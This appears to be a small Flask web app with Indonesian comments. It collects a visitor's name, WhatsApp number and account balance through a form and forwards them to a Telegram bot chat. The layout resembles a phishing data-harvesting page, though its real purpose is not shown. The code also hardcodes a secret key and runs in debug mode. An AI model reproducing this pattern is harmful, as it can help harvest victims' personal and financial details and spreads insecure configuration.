from flask import Flask, render_template, request, redirect, session
import requests
import os

app = Flask(__name__)
app.secret_key = 'j1s34ft43utbu76'

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/')
def home():
    # Halaman 1 hanya tampil gambar full body
    return render_template('home.html')

@app.route("/registrasi", methods=['GET', 'POST'])
def registrasi():
    if request.method == 'POST':
        nama = request.form.get('nama')
        WA = request.form.get('WA')
        saldo = request.form.get('saldo')

        caption = (
            "🔔DATA BARU:\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱WA: {WA}\n"
            f"💰saldo: {saldo}"
        )

        requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
            )

        return redirect('/close')
    return render_template('registrasi.html')

@app.route('/close')
def close():
    # halaman3 hanya tampil gambar penutup full body
    return render_template('close.html')

if __name__ == '__main__':
    app.run(debug=True)
